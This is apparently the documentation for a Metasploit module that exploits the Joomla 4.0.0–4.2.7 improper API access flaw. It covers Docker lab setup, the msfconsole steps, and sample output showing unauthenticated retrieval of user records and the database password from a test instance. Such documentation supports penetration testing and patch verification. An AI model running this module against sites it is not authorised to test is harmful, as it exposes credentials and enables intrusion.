
## Vulnerable Application

Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability.
This vulnerability allows unauthenticated users access to webservice endpoints which contain
sensitive information. Specifically for this module we exploit the users and config/application
endpoints.

This module was tested against Joomla 4.2.7 running on Docker.

## Install Joomla on Ubuntu 22.04

From https://www.techrepublic.com/article/how-to-deploy-joomla-docker/
```
sudo apt-get install docker.io -y
sudo docker network create joomla-network
sudo docker pull mysql:5.7
sudo docker pull joomla:4.2.7-php8.1-apache
sudo docker volume create mysql-data
sudo docker run -d --name joomladb  -v mysql-data:/var/lib/mysql --network joomla-network -e "MYSQL_ROOT_PASSWORD=PWORD" -e MYSQL_USER=joomla -e "MYSQL_PASSWORD=PWORD" -e "MYSQL_DATABASE=joomla" mysql:5.7
sudo docker volume create joomla-data
sudo docker run -d --name joomla -p 80:80 -v joomla-data:/var/www/html --network joomla-network -e JOOMLA_DB_HOST=joomladb -e JOOMLA_DB_USER=joomla -e JOOMLA_DB_PASSWORD=PWORD joomla
```

Browse to port 80, and finish the installation

## Verification Steps

1. Install the application, and finish the configuration
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/joomla_api_improper_access_checks`
4. Do: `set rhosts [ip]`
5. Do: `run`
6. You should get sensitive information about the users and configuration

## Scenarios

### Version 4.2.7 from Docker

```
└─$ ./msfconsole -qr joomla_improper.rb
[*] Processing joomla_improper.rb for ERB directives.
resource (joomla_improper.rb)> use auxiliary/scanner/http/joomla_api_improper_access_checks
resource (joomla_improper.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (joomla_improper.rb)> set verbose true
verbose => true
resource (joomla_improper.rb)> run
[*] Joomla version detected: 4.2.7
[+] Joomla version 4.2.7 is vulnerable
[*] Attempting user enumeration
[+] Users JSON saved to /root/.msf4/loot/20230416225106_default_1.1.1.1_joomla_users_jso_345565.json
[+] Joomla Users
============

 ID   Super User  Name    Username  Email          Send Email  Register Date        Last Visit Date  Group Names
 --   ----------  ----    --------  -----          ----------  -------------        ---------------  -----------
 400  *           joomla  joomla    none@none.com  1           2023-04-16 23:07:42                   Super Users

[*] Attempting config enumeration
[+] Config JSON saved to /root/.msf4/loot/20230416225106_default_1.1.1.1_joomla_config_js_812393.json
[+] Joomla Config
=============

 Setting      Value
 -------      -----
 db host      joomladb3
 db name      joomla_db
 db password  PWORD
 db prefix    l57cr_
 db prefix    0
 db user      root
 dbtype       mysqli

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
